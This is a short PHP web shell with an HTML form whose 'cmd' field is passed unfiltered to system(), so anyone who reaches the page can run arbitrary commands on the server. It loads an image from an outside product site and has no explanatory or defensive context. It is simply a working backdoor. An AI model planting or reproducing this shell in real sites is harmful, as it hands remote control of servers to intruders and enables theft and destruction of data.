<html>
<body>
<center>
<img src="https://www.mpadeco.com/thumb.php?zc=3&f=0&src=/sites/mpadeco/files/products/d226.png&fl=none&w=360&h=360">
<body style="background-color:#000000">
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<font color=red>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</center>
</html>
